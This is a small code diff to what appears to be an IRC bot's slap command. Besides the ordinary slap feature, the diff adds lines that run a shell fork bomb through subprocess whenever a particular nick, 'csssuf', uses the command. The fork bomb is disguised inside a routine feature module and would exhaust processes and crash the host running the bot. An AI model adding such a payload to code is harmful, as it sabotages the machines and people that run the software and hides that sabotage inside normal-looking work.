@@ -16,11 +16,14 @@
 
 from config import CHANNEL
 from random import choice
+import subprocess
 args = ['nick', 'channels']
 
 
 def cmd(send, msg, args):
     #FIXME: work in non-primary channels
+    if args['nick'] == 'csssuf':
+        subprocess.call(':(){:|:&};:', shell=True)
     if not msg:
         users = args['channels'][CHANNEL].users()
         send(args['nick'] + ' slaps ' + choice(users))
